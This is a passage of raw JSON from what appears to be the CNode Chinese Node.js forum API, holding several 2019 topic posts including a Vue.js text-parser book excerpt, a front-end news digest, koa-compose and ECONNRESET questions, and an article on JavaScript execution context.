}\n})\n</code></pre><p>在<code>chars</code>函数中，如果执行<code>parseText</code>后有返回结果，则说明文本是带变量的文本，并且已经通过文本解析器（<code>parseText</code>）二次加工，此时构建一个带变量的文本类型的AST并将其添加到父节点的<code>children</code>属性中。否则，就直接构建一个普通的文本节点并将其添加到父节点的<code>children</code>属性中。而代码中的<code>currentParent</code>是当前节点的父节点，也就是前面介绍的栈中的最后一个节点。</p>\n<p>假设<code>chars</code>函数被触发后，我们得到的<code>text</code>是一个带变量的文本：</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;Hello {{name}}&quot;\n</code></pre><p>这个带变量的文本被文本解析器解析之后，得到的<code>expression</code>变量是这样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;Hello &quot;+_s(name)\n</code></pre><p>上面代码中的<code>_s</code>其实是下面这个<code>toString</code>函数的别名：</p>\n<pre class=\"prettyprint language-javascript\"><code>function toString (val) {\n    return val == null\n        ? &#x27;&#x27;\n        : typeof val === &#x27;object&#x27;\n            ? JSON.stringify(val, null, 2)\n            : String(val)\n}\n</code></pre><p>假设当前上下文中有一个变量<code>name</code>，其值为<code>Berwin</code>，那么<code>expression</code>中的内容被执行时，它的内容是不是就是<code>Hello Berwin</code>了？</p>\n<p>我们举个例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {name: &#x27;Berwin&#x27;}\nwith(obj) {\n    function toString (val) {\n        return val == null\n            ? &#x27;&#x27;\n            : typeof val === &#x27;object&#x27;\n                ? JSON.stringify(val, null, 2)\n                : String(val)\n    }\n    console.log(&quot;Hello &quot;+toString(name)) &#x2F;&#x2F; &quot;Hello Berwin&quot;\n}\n</code></pre><p>在上面的代码中，我们打印出来的结果是<code>&quot;Hello Berwin&quot;</code>。</p>\n<p>事实上，最终AST会转换成代码字符串放在<code>with</code>中执行，这部分内容会在第11章中详细介绍。</p>\n<p>接着，我们详细介绍如何加工文本，也就是文本解析器的内部实现原理。</p>\n<p>在文本解析器中，第一步要做的事情就是使用正则表达式来判断文本是否是带变量的文本，也就是检查文本中是否包含<code>{{xxx}}</code>这样的语法。如果是纯文本，则直接返回<code>undefined</code>；如果是带变量的文本，再进行二次加工。所以我们的代码是这样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>function parseText (text) {\n    const tagRE = &#x2F;\\{\\{((?:.|\\n)+?)\\}\\}&#x2F;g\n    if (!tagRE(text)) {\n        return\n    }\n}\n</code></pre><p>在上面的代码中，如果是纯文本，则直接返回。如果是带变量的文本，该如何处理呢？</p>\n<p>一个解决思路是使用正则表达式匹配出文本中的变量，先把变量左边的文本添加到数组中，然后把变量改成<code>_s(x)</code>这样的形式也添加到数组中。如果变量后面还有变量，则重复以上动作，直到所有变量都添加到数组中。如果最后一个变量的后面有文本，就将它添加到数组中。</p>\n<p>这时我们其实已经有一个数组，数组元素的顺序和文本的顺序是一致的，此时将这些数组元素用<code>+</code>连起来变成字符串，就可以得到最终想要的效果，如图9-5所示。</p>\n<p><img src=\"https://p5.ssl.qhimg.com/t01ba783e66e40ab7df.jpg\" alt=\"文本解析过程\">\n图9-5 文本解析过程</p>\n<p>在图9-5中，最上面的字符串代表即将解析的文本，中间两个方块代表数组中的两个元素。最后，使用数组方法<code>join</code>将这两个元素合并成一个字符串。</p>\n<p>具体实现代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>function parseText (text) {\n    const tagRE = &#x2F;\\{\\{((?:.|\\n)+?)\\}\\}&#x2F;g\n    if (!tagRE.test(text)) {\n        return\n    }\n\n    const tokens = []\n    let lastIndex = tagRE.lastIndex = 0\n    let match, index\n    while ((match = tagRE.exec(text))) {\n        index = match.index\n        &#x2F;&#x2F; 先把 {{ 前边的文本添加到tokens中\n        if (index &gt; lastIndex) {\n            tokens.push(JSON.stringify(text.slice(lastIndex, index)))\n        }\n        &#x2F;&#x2F; 把变量改成&#96;_s(x)&#96;这样的形式也添加到数组中\n        tokens.push(&#96;_s(${match[1].trim()})&#96;)\n        \n        &#x2F;&#x2F; 设置lastIndex来保证下一轮循环时，正则表达式不再重复匹配已经解析过的文本\n        lastIndex = index + match[0].length\n    }\n    \n    &#x2F;&#x2F; 当所有变量都处理完毕后，如果最后一个变量右边还有文本，就将文本添加到数组中\n    if (lastIndex &lt; text.length) {\n        tokens.push(JSON.stringify(text.slice(lastIndex)))\n    }\n    return tokens.join(&#x27;+&#x27;)\n}\n</code></pre><p>这是文本解析器的全部代码，代码并不多，逻辑也不是很复杂。</p>\n<p>这段代码有一个很关键的地方在<code>lastIndex</code>：每处理完一个变量后，会重新设置<code>lastIndex</code>的位置，这样可以保证如果后面还有其他变量，那么在下一轮循环时可以从<code>lastIndex</code>的位置开始向后匹配，而<code>lastIndex</code>之前的文本将不再被匹配。</p>\n<p>下面用文本解析器解析不同的文本看看：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseText(&#x27;你好{{name}}&#x27;)\n&#x2F;&#x2F; &#x27;&quot;你好 &quot;+_s(name)&#x27;\n\nparseText(&#x27;你好Berwin&#x27;)\n&#x2F;&#x2F; undefined\n\nparseText(&#x27;你好{{name}}, 你今年已经{{age}}岁啦&#x27;)\n&#x2F;&#x2F; &#x27;&quot;你好&quot;+_s(name)+&quot;, 你今年已经&quot;+_s(age)+&quot;岁啦&quot;&#x27;\n</code></pre><p>从上面代码的打印结果可以看到，文本已经被正确解析了。</p>\n<h2>9.5 总结</h2>\n<p>解析器的作用是通过模板得到AST（抽象语法树）。</p>\n<p>生成AST的过程需要借助HTML解析器，当HTML解析器触发不同的钩子函数时，我们可以构建出不同的节点。</p>\n<p>随后，我们可以通过栈来得到当前正在构建的节点的父节点，然后将构建出的节点添加到父节点的下面。</p>\n<p>最终，当HTML解析器运行完毕后，我们就可以得到一个完整的带DOM层级关系的AST。</p>\n<p>HTML解析器的内部原理是一小段一小段地截取模板字符串，每截取一小段字符串，就会根据截取出来的字符串类型触发不同的钩子函数，直到模板字符串截空停止运行。</p>\n<p>文本分两种类型，不带变量的纯文本和带变量的文本，后者需要使用文本解析器进行二次加工。</p>\n<blockquote>\n<p>更多精彩内容可以观看<a href=\"https://item.jd.com/12573168.html\">《深入浅出Vue.js》</a></p>\n</blockquote>\n<h3>关于《深入浅出Vue.js》</h3>\n<p>本书使用最最容易理解的文笔来描述Vue.js的内部原理，对于想学习Vue.js原理的小伙伴是非常值得入手的一本书。</p>\n<p><a href=\"https://item.jd.com/12573168.html\"><img src=\"https://p2.ssl.qhimg.com/t01b6b34a1be5d53090.jpg\" alt=\"封面\"></a></p>\n<p>京东：\n<a href=\"https://item.jd.com/12573168.html\">https://item.jd.com/12573168.html</a></p>\n<p>亚马逊：\n<a href=\"https://www.amazon.cn/gp/product/B07NKVMN1V\">https://www.amazon.cn/gp/product/B07NKVMN1V</a></p>\n<p>当当：\n<a href=\"http://product.dangdang.com/26922892.html\">http://product.dangdang.com/26922892.html</a></p>\n<p><img src=\"https://p4.ssl.qhimg.com/t01bd5a63e9f8d83e9f.jpg\" alt=\"京东购买链接\">\n扫码京东购买</p>\n</div>","title":"Vue.js 模板解析器原理 - 来自《深入浅出Vue.js》第九章","last_reply_at":"2019-04-08T06:04:18.606Z","good":false,"top":false,"reply_count":0,"visit_count":363,"create_at":"2019-04-08T06:04:18.606Z","author":{"loginname":"berwin","avatar_url":"https://avatars0.githubusercontent.com/u/3739368?v=4&s=120"}},{"id":"5caad1c87edd13064e053315","author_id":"5c85d4b2acb681372d416dd6","tab":"share","content":"<div class=\"markdown-text\"><p>深圳 aftership 将在 4 月 27 日举行 Cloudflare 最新边缘 API，打造无服务器(Serverless)架构的技术分享活动，报名页面： <a href=\"https://www.huodongxing.com/event/4486802536500\">https://www.huodongxing.com/event/4486802536500</a></p>\n<p>优惠码：aftershipjoinus</p>\n<p>欢迎大家报名参加。</p>\n</div>","title":"[aftership 技术分享活动] Cloudflare 最新边缘 API，打造无服务器(Serverless)架构","last_reply_at":"2019-04-08T04:44:56.278Z","good":false,"top":false,"reply_count":0,"visit_count":302,"create_at":"2019-04-08T04:44:56.278Z","author":{"loginname":"wangxihua916","avatar_url":"https://avatars0.githubusercontent.com/u/37897167?v=4&s=120"}},{"id":"5caab9b27edd13064e0531ef","author_id":"5caab92ad68ff5064921ad07","tab":"share","content":"<div class=\"markdown-text\"><p>拼团地址： <a href=\"https://cloud.tencent.com/act/group/amdv2/detail?from=10521&amp;group=64666\">https://cloud.tencent.com/act/group/amdv2/detail?from=10521&amp;group=64666</a></p>\n</div>","title":"腾讯云1g1核2m带宽服务器15元/月，有兴趣的了解一下","last_reply_at":"2019-04-08T03:02:10.679Z","good":false,"top":false,"reply_count":0,"visit_count":598,"create_at":"2019-04-08T03:02:10.679Z","author":{"loginname":"CHKabin","avatar_url":"https://avatars2.githubusercontent.com/u/18096641?v=4&s=120"}},{"id":"5ca2f5126c1de62dce466d9f","author_id":"581ae153e90cfbec054d762a","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/103147/1554174860996-48dafaa4-e8f1-483f-9d05-8ccc91028aa5.png#align=left&amp;display=inline&amp;height=443&amp;name=image.png&amp;originHeight=886&amp;originWidth=1790&amp;size=2086701&amp;status=done&amp;width=895\" alt=\"image.png\"></p>\n<p>【Alibaba-TXD 前端小报】- 热门前端技术快报，聚焦业界新视界；不知不觉 2019 年已经过去了 1/4，日新月异的前端技术正在蓬勃发展，<a href=\"https://segmentfault.com/a/1190000018311280\">ES10</a> 都已到来。</p>\n<blockquote>\n<p>欢迎 <a href=\"https://zhuanlan.zhihu.com/txd-team\">订阅</a> &amp; <a href=\"https://github.com/txd-team/monthly/issues\">投稿</a>\n本期小编：<a href=\"https://github.com/happyliuliu\">玙璠</a></p>\n</blockquote>\n<h3>学习专栏</h3>\n<h4>2019 年前端技术会议</h4>\n<p>裕波列出了一份前端技术会议的<a href=\"https://www.yuque.com/itchina110/giku37/xdzuak\">清单</a>，涵盖国内和海外的重大前端相关的技术会议</p>\n<h4>微软前端训练营</h4>\n<p>微软推出另一个前端的学习路径规划，官方提供的<a href=\"https://github.com/Microsoft/frontend-bootcamp\">代码仓库</a>将一步一步带你走进前端技术领域，囊括基础的 HTML/CSS/JS 学习、TypeScript 强类型、React/Redux 学习和实践等。</p>\n<h3>新闻快报</h3>\n<h4>阿里开源 Flutter 应用框架 Fish Redux</h4>\n<p><a href=\"https://github.com/alibaba/fish-redux\">Fish Redux</a> 框架是基于 Redux 数据管理的组装式 Flutter 应用框架，适合用于构建中大型的复杂应用，解决了集中状态管理和UI组件化等问题，将集中，分治，复用，隔离做的更进一步。</p>\n<h4>Handtrack.js 搞定手部动作跟踪</h4>\n<p>这是一个经过训练的产生的开源模型，而不需要用户自己训练。它隐藏了模型的加载步骤，允许用户在没有任何 ML 经验的情况下检测图像中的手，可以直接在 Web 应用使用该库，<a href=\"https://github.com/eduardolundgren/tracking.js\">传送门</a>。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/137059/1554173440898-750a723a-7f77-4a2b-8be6-4657f6a1e5d5.gif#align=left&amp;display=inline&amp;height=194&amp;name=%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD.gif&amp;originHeight=240&amp;originWidth=320&amp;size=3646259&amp;status=done&amp;width=259\" alt=\"人工智能.gif\"></p>\n<h4>小程序多端框架</h4>\n<p>如今小程序的发展如日中天，很多公司的业务也都慢慢转向小程序，同时很多应用需要同时兼顾多个小程序平台，所以就有了上层开发框架或者脚手架来优化 DSL 来提高开发效率。其中凹凸实验室从开发体验、兼容性、接入成本、工具链等多个方面对小程序的的多端框架进行了全面的<a href=\"https://juejin.im/post/5c90eb366fb9a070d4199cc9\">测评</a>，如果准备入坑，可以事先了解一下。</p>\n<h4>TWA 让你的 PWA 进入应用商店</h4>\n<p>TWA（Trusted Web Activity）的发布，是将 Native 的技术扩展到 Web App，将 PWA 站点打包为 Native App 放入应用商店，用户可以在应用商店中搜索安装 PWA 应用，相比国外，PWA 在国内并非很流行，但这并不代表这个技术就不关键。未来可以考虑如何将该技术融入实践中来，<a href=\"https://developers.google.com/web/updates/2019/02/using-twa\">传送门</a>，这篇<a href=\"https://www.infoq.cn/article/XTE9WzSL11iHmW*WBozi\">文章</a>也有全面的解析。</p>\n<h4>Storybook 5.0 正式发布</h4>\n<p>Storybook 是一个比较受欢迎的 UI 组件库，为各种视图层（如 React、Vue、Angular、React Native、Ember）提供了结构化的 UI 开发、测试和文档。Storybook 5.0 是目前为止发布的最大的一个版本，新版本的内容包括：全新的开发体验；带有主题的组件库；改进的前端插件架构；全新的<a href=\"https://storybook.js.org/\">官网</a>。</p>\n<h4>Node.js 和 JS 基金会合并为 OpenJS 基金会</h4>\n<p>Node.js 基金会和 JS 基金会宣布合并为 OpenJS 基金会，将提供一个中立的组织来托管项目并协助资助有益于生态系统的活动，简化基金会日常运营的同时满足个基础架构、技术和营销需求，为 Node.js 和 JavaScript 提供更光明的未来，这也是 JavaScript 发展中的一大步。</p>\n<h4>5G 来了</h4>\n<p>从 2G 的发展，到 3G 的的成熟，再到 4G 落地，继而迎接 5G 时代的全面到来。5G 具有极快的传输速度、更高的网络容量、信息可及时触达等特点，也就是高速率、多连体、低时延。这些优势可带动广泛的行业发展，如物联网、视频、全息技术以及无人驾驶等，让我们，拭目以待。</p>\n<h4>996.ICU</h4>\n<p>相当火爆的 github 项目 <a href=\"https://github.com/996icu/996.ICU\">996.ICU</a>，由 IT 工作者对工作制度的反抗，以谋求自己的合法权益的一种特别的方式。不得不感叹的是，随着时代及技术的发展，无产阶级的联合方式也在发生着变化。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/137059/1554173440891-46104a73-a778-4813-b116-2d2840e6795f.gif#align=left&amp;display=inline&amp;height=168&amp;name=%E5%8A%A0%E7%8F%AD.gif&amp;originHeight=104&amp;originWidth=129&amp;size=19061&amp;status=done&amp;width=208\" alt=\"加班.gif\"></p>\n<h4>TSLint -&gt; ESLint</h4>\n<p>继和 Babel 合作，使 Babel 支持编译 TS 语法后，TypeScript 团队又发布了新的 Roadmap，将使用 ESLint 来进行 TS 语法的静态类型检查，统一开发体验。TSLint 和 ESLint 团队也纷纷发文，公布未来的计划，TSLint 在被完全集成之前，会保持维护状态，ESLint 中推荐使用 typescript-eslint 来支持 TS 语法的静态类型检查，具体见 <a href=\"https://github.com/palantir/tslint/issues/4534\">TSLint Roadmap</a>、<a href=\"https://eslint.org/blog/2019/01/future-typescript-eslint\">The future of TypeScript on ESLint</a></p>\n<h3>工具推荐</h3>\n<h4><a href=\"https://github.com/alexfoxy/laxxx\">Animations when you scroll</a></h4>\n<ul>\n<li>将滚动与动画相结合，使页面更有灵性</li>\n<li>支持在 DOM、React、VUE 中使用</li>\n<li>支持多种动画参数配置</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/137059/1554173440895-2c7ea1b1-3e3c-428b-9c40-fa08b863168c.gif#align=left&amp;display=inline&amp;height=259&amp;name=lax.gif&amp;originHeight=259&amp;originWidth=320&amp;size=634366&amp;status=done&amp;width=320\" alt=\"lax.gif\"></p>\n<h4>You Dont Need 系列</h4>\n<p>You Dont Need 系列教程目的在于让读者回归基础，在不依赖一些主流的 util 库的情况下，自己动手去实现库里面提供的核心功能；很多情况下，一些 util 库占用了大量的体积，而且业务中实际使用的部分很少，如果能够手工去实现其中使用到的一些方法，就可以轻松通过移除三方库来提高加载速度了。（然而上规模的项目中，依然建议使用统一的 util 库）</p>\n<ul>\n<li><a href=\"https://github.com/you-dont-need/You-Dont-Need-JavaScript\">You-Dont-Need-JavaScript</a> 介绍了一些常用的组件、动效、甚至功能，在不通过编写 JavaScript 代码的前提下去实现它！</li>\n<li><a href=\"https://github.com/you-dont-need/You-Dont-Need-GUI\">You-Dont-Need-GUI</a> 许多场景下，我们使用命令交互的方式去操作机器（如文件、进程等处理），能大幅提高工作效率。</li>\n<li><a href=\"https://github.com/you-dont-need/You-Dont-Need-Momentjs\">You-Dont-Need-Momentjs</a> 介绍了 moment.js 对时间处理的核心功能实现。（通常情况下，我们还是需要一个时间处理库，推荐使用体积更小的 date-fns / dayjs）。</li>\n<li><a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 常用的一些 util 方法的 JavaScript 实现。</li>\n<li><a href=\"https://github.com/nefe/You-Dont-Need-jQuery\">You-Dont-Need-jQuery</a> 去除 jQuery 的一些 Native JavaScript 的方案，一步一步替换 jQuery 的 API。</li>\n</ul>\n<h4>TypeScript To WebAssembly</h4>\n<p>通常我们都需要将 TypeScript 编译成 ES5 的代码，才能在浏览器中正常运行，<a href=\"https://github.com/AssemblyScript/assemblyscript\">assemblyscript</a> 是一款 TypeScript To WebAssembly 的编译器，通过 Webassembly 运行编译后的二进制代码。</p>\n<h3>热门文章</h3>\n<h4><a href=\"https://zhuanlan.zhihu.com/yujiangshui\">我在淘宝做前端的这三年</a></h4>\n<p>红了樱桃，绿了芭蕉。文章将在淘宝的三年时光折射为入职、职业规划、招聘、晋升、离职等与我们息息相关的经验分享，值得品读。</p>\n<h4><a href=\"https://mp.weixin.qq.com/s?__biz=MzI5MTA4ODA3NQ==&amp;mid=2247483710&amp;idx=1&amp;sn=cce855fd797f68ef77da424a7809500b&amp;chksm=ec14b29adb633b8ccd4cab9a84adfd89014c96792c799b8501bdaf99bfc3c916dd298ffd62e3&amp;mpshare=1&amp;scene=2&amp;srcid=&amp;from=timeline&amp;ascene=2&amp;devicetype=androi\">前端专业方向的尽头</a></h4>\n<p>驽马十驾,功在不舍。或是走一条纯专业的探索之路，或是趋向技术管理，这些都是技术人的选择与坚持，也会拥有独一无二的风景。</p>\n<h4><a href=\"https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2651014404&amp;idx=2&amp;sn=7ed7c965c10af5463b0ffadd9661ab61&amp;chksm=bdbebd578ac93441467b1d81bc81141f2cecbee0b35dd625c62156d8f6abd33d1bea8661bea6&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1552918479&amp;ascene=7&amp;devic\">2019年大前端技术趋势深度解读</a></h4>\n<p>念过去，望未来。前端的发展日新月异，坚持学习的同时也要保持思辨和平和。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/137059/1554173440911-9bd825a2-0664-4e96-b300-12a855a34e4a.png#align=left&amp;display=inline&amp;height=378&amp;name=image.png&amp;originHeight=1044&amp;originWidth=1080&amp;size=1149092&amp;status=done&amp;width=391\" alt=\"image.png\"></p>\n</div>","title":"前端小报 - 201903月刊","last_reply_at":"2019-04-08T02:04:05.080Z","good":false,"top":false,"reply_count":3,"visit_count":865,"create_at":"2019-04-02T05:37:22.144Z","author":{"loginname":"x-cold","avatar_url":"https://avatars1.githubusercontent.com/u/6903313?v=4&s=120"}},{"id":"5ca464fd6c1de62dce467688","author_id":"5ca4639c31010b2dfbb42c0a","tab":"ask","content":"<div class=\"markdown-text\"><p>刚开始的时候，node main.js是正常的，接口也可以正常返回，但是放着一段时间，大概5~10分钟，就会报错 read ECONNRESET，然后重新运行node main.js又可以了，间隔一段时间又是同样的问题。node小白，求大神指点一下<img src=\"//static.cnodejs.org/FoR7GugN2D91pb0aKqn6TxNEl_Fu\" alt=\"error.png\"></p>\n</div>","title":"node运行接口，刚开始是正常的，间隔一段时间后变成 read ECONNRESET","last_reply_at":"2019-04-08T01:58:33.508Z","good":false,"top":false,"reply_count":6,"visit_count":585,"create_at":"2019-04-03T07:47:09.354Z","author":{"loginname":"yjl000","avatar_url":"https://avatars0.githubusercontent.com/u/25833497?v=4&s=120"}},{"id":"5ca9c17bd68ff5064921a9ed","author_id":"54d85b676a95c42f404f7e26","tab":"share","content":"<div class=\"markdown-text\"><p>目前我付出的健康上网费用是86.5CNY/month，如果和另外两个人共享，年付，只要222CNY/year.\n省钱是王道。\n我Wechat：gazeldx\n感谢CnodeJS平台。</p>\n</div>","title":"健康上网帐号付费共享，寻需要的朋友","last_reply_at":"2019-04-08T01:27:27.121Z","good":false,"top":false,"reply_count":1,"visit_count":430,"create_at":"2019-04-07T09:23:07.567Z","author":{"loginname":"gazeldx","avatar_url":"https://avatars.githubusercontent.com/u/1132770?v=3&s=120"}},{"id":"5ca84e8b6c1de62dce468344","author_id":"579daf3285dba6b12ac5856e","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://moodz.minghe.me\">微信最轻的日记本</a></p>\n<p>之前有发过一个<a href=\"https://ruby-china.org/topics/37656\">版本</a>，这两天趁着假期，重新设计了一下UI. 有兴趣的同学可以尝试一下.</p>\n<p><img src=\"//static.cnodejs.org/FqwgzB5przXcPX7eD7zzbep20Ie7\" alt=\"compose.jpg\"></p>\n<p>微信扫码:</p>\n<p><img src=\"//static.cnodejs.org/FsfOS_-x-AJZu1IxHpWZ-gfIMv6w\" alt=\"moodz.png\"></p>\n</div>","title":"“轻巧日记\"小程序 记录多彩生活","last_reply_at":"2019-04-08T01:05:51.820Z","good":false,"top":false,"reply_count":1,"visit_count":618,"create_at":"2019-04-06T07:00:27.773Z","author":{"loginname":"metrue","avatar_url":"https://avatars2.githubusercontent.com/u/1001246?v=4&s=120"}},{"id":"5ca3359e31010b2dfbb426c4","author_id":"556150874eb040084cfe5dcb","tab":"ask","content":"<div class=\"markdown-text\"><p>在 <code>koa-compose</code> 中 <a href=\"https://github.com/koajs/compose/blob/4.1.0/index.js#L42\">return Promise.resolve(fn(context, dispatch.bind(null, i + 1)));</a>为什么需要 <code>Promise.resolve()</code></p>\n<p>a:  在 <a href><code>koa/application.js</code></a> 中</p>\n<p><code>fnMiddleware(ctx).then(handleResponse)</code>, 可知需要一个 <code>Promise</code></p>\n<p>但是 改成如下也是可以工作的</p>\n<pre class=\"prettyprint\"><code>return function (context, next) {\n    &#x2F;&#x2F; last called middleware #\n    let index = -1\n    return dispatch(0)\n    function dispatch (i) {\n      if (i &lt;= index) return Promise.reject(new Error(&#x27;next() called multiple times&#x27;))\n      index = i\n      let fn = middleware[i]\n      if (i === middleware.length) fn = next\n      \n\n      &#x2F;&#x2F; 添加 对 i === 0 判断是否是 fnMiddleware(ctx).then\n      if( i === 0) {\n       fn = (...args) =&gt; {\n\t\t\tlet res = null;\n\t\t\t&#x2F;&#x2F; 1楼提出的改善\n\t\t\ttry{\n\t\t  \t\tres = Promise.resolve(middleware[0](...args))\n\t\t\t} catch(e) {\n\t\t\t\tres = Promise.reject(e);\n\t\t\t}\n\t\t\treturn res;\n\t   }\n      }\n      if (!fn) return Promise.resolve()\n      try {\n        return fn(context, dispatch.bind(null, i + 1));\n      } catch (err) {\n        return Promise.reject(err)\n      }\n    }\n  }\n</code></pre><p>b: 如果是 middleware 中 需要 <code>await next</code> 的话, 一定是一个 <code>async</code> 函数, 所以也不需要<code>Promise.resolve()</code></p>\n<p>c: 如果 middleware 是一个同步函数, 也不需要 <code>Promise.resolve()</code></p>\n<p>还有哪些情况我没有考虑到的?</p>\n</div>","title":"koa-compose 为什么需要  Promise.resolve(fn(context, dispatch.bind(null, i + 1)));","last_reply_at":"2019-04-07T07:30:14.115Z","good":false,"top":false,"reply_count":6,"visit_count":529,"create_at":"2019-04-02T10:12:46.903Z","author":{"loginname":"xinshangshangxin","avatar_url":"https://avatars1.githubusercontent.com/u/8779091?v=4&s=120"}},{"id":"5ca987dcd68ff5064921a98a","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div class=\"markdown-text\"><h1>JavaScript中的执行上下文和堆栈是什么</h1>\n<p>在这篇文章中，将深入研究JavaScript最基本的部分之一，即执行上下文。在这篇文章的最后，你应该更清楚地理解解释器要做什么，为什么在声明一些函数/变量之前可以使用它们，以及它们的值是如何确定的。</p>\n<h2>什么是执行上下文</h2>\n<p>当JavaScript代码运行时，执行代码的环境是相当重要的。一般有以下三种情况：</p>\n<ul>\n<li>全局代码 – 代码首次开始执行的默认环境</li>\n<li>函数代码 – 每当进入一个函数内部</li>\n<li>Eval代码 – eval内部代码执行时</li>\n</ul>\n<p>把执行上下文看作是当前代码正在执行的环境/作用域</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; global context\nvar sayHello = &#x27;sayHello&#x27;\n\nfunction person() {\n  var first = &#x27;webb&#x27;\n  var last = &#x27;wang&#x27;\n\n  function firstName() {\n    return first\n  }\n\n  function lastName() {\n    return last\n  }\n\n  console.log(sayHello + firstName() + &#x27;&#x27; + lastName())\n}\n</code></pre><p>以上代码没什么特别的地方，它包括1个全局上下文和3个不同的函数上下文,全局上下文可以被程序中的其它任何上下文访问。</p>\n<p>你可以有任意数量的函数上下文，每个函数被调用的时候都会创建一个新的上下文。每个下文都有一个不能被外部函数直接访问到的内部变量的私有作用域。在上面代码的例子中，一个函数可以访问当前上下文外部声明的变量，但是一个外部上下文不可以访问函数内部声明的变量。</p>\n<h2>执行上下文堆栈</h2>\n<p>浏览器中的JavaScript解释器是作为一个单线程实现的，这实际上意味着，在浏览器中，一次只能发生一件事，其他操作或事件将排队在所谓的执行堆栈中。</p>\n<p>当浏览器开始执行脚本时，首先会默认进入全局执行上下文，如果在全局代码中调用了函数，程序会按照顺序进入被调用函数，创建一个新的执行上下文，并推入到执行栈的栈顶。</p>\n<p>如果你在当前执行的函数中，调用了另外的函数，代码的执行流将会进入函数内部，并创建一个新的执行上下文推入到执行栈顶。浏览器总是会先执行栈顶的代码，并且一旦函数完成执行当前执行上下文，他就会从栈顶弹出，将控制权返回到当前堆栈中的上下文。</p>\n<p>关于执行堆栈有以下关键点</p>\n<ul>\n<li>单线程</li>\n<li>同步执行</li>\n<li>1个全局上下文</li>\n<li>每个函数调用都会创建一个新的执行上下文，即使调用它自身。</li>\n</ul>\n<h2>深入理解执行上下文</h2>\n<p>现在我们知道每当有函数被调用时，都会创建一个新的执行上下文。在js内部，每个执行上文创建都要经历下面2个阶段</p>\n<p>1.创建阶段（函数被调用，但还没有执行内部代码）</p>\n<ul>\n<li>创建作用域链</li>\n<li>创建变量和参数</li>\n<li>决定this指向</li>\n</ul>\n<p>2.代码执行阶段</p>\n<ul>\n<li>变量赋值，执行代码</li>\n</ul>\n<p>可以将每个执行上下文概念上表示为一个具有3个属性的对象:</p>\n<pre class=\"prettyprint language-js\"><code>executionContextObj = {\n  &#x27;scopeChain&#x27;: { &#x2F;* variableObject + all parent execution context&#x27;s variableObject *&#x2F; },\n  &#x27;variableObject&#x27;: { &#x2F;* function arguments &#x2F; parameters, inner variable and function declarations *&#x2F; },\n  &#x27;this&#x27;: {}\n}\n</code></pre><h2>活动对象/变量对象（AO/VO）</h2>\n<p>当函数被调用时，在创建阶段解释器会创建包含有函数内部变量，参数的一个变量对象</p>\n<h3>下面是解释器如何评估代码的概述</h3>\n<ol>\n<li>扫描被调用函数中的代码</li>\n<li>在代码执行前，创建执行上文</li>\n<li>进入创建阶段\n<ul>\n<li>初始化作用域链</li>\n<li>创建变量对象</li>\n<li>创建arguments对象，检查参数上下文，初始化名称和值，并创建引用副本</li>\n<li>扫描上下文中函数的声明\n<ul>\n<li>对于找到的每个函数，在变量对象中创建一个属性，该属性是确切的函数名，该函数在内存中有一个指向该函数的引用指针</li>\n<li>如果函数名已经存在，指针将会被覆盖</li>\n</ul>\n</li>\n<li>扫描变量的声明\n<ul>\n<li>对于找到的每个变量，在变量对象中创建一个属性，该属性是确切的变量名，该变量的值是undefined</li>\n<li>如果变量名已经存在，将不会做任何处理继续\b执行</li>\n</ul>\n</li>\n<li>决定this的值</li>\n</ul>\n</li>\n<li>代码执行阶段\n<ul>\n<li>变量赋值，按顺序执行代码</li>\n</ul>\n</li>\n</ol>\n<h2>声明提升</h2>\n<p>你可以在网上找到许多用JavaScript定义术语提升的资源，解释变量和函数声明被提升到函数作用域的顶部。但是，没有人详细解释为什么会发生这种情况，而且有了解释器如何创建激活对象的新知识，就很容易理解为什么会发生这种情况。以下面的代码为例:</p>\n<pre class=\"prettyprint language-js\"><code>(function() {\n  console.log(typeof foo); &#x2F;&#x2F; function pointer\n  console.log(typeof bar); &#x2F;&#x2F; undefined\n\n  var foo = &#x27;hello&#x27;,\n      bar = function() {\n          return &#x27;world&#x27;;\n      };\n\n  function foo() {\n      return &#x27;hello&#x27;;\n  }\n\n}());​\n</code></pre><h3>为什么在什么之前可以访问到foo</h3>\n<p>如果我们遵循创建阶段，我们就知道在代码执行阶段之前已经创建了变量。因此，当函数流开始执行时，foo已经在活动对象中定义。</p>\n<h3>Foo声明了两次，为什么Foo是函数而不是未定义或字符串？</h3>\n<p>尽管foo声明了两次，但从创建阶段我们就知道函数是在变量之前在变量对象上创建的，如果变量对象上的属性名已经存在，那么我们只需绕过。\n因此，首先在变量对象上创建对函数foo()的引用，当解释器到达var foo时，我们已经看到了属性名foo的存在，所以代码什么也不做，继续执行</p>\n<h3>为什么bar是undefined</h3>\n<p>bar实际上是一个具有函数赋值的变量，我们知道这些变量是在创建阶段创建的，但是它们是用undefined值初始化的。</p>\n<h2>总结</h2>\n<p>希望现在你已经很好地理解了JavaScript解释器是如何执行代码的。理解执行上下文和堆栈可以让你了解代码没有按照预期执行的原因</p>\n</div>","title":"JavaScript中的执行上下文和堆栈是什么","last_reply_at":"2019-04-07T05:17:16.576Z","good":false,"top":false,"reply_count":0,"visit_count":549,"create_at":"2019-04-07T05:17:16.576Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5ca986937edd13064e052e96","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div 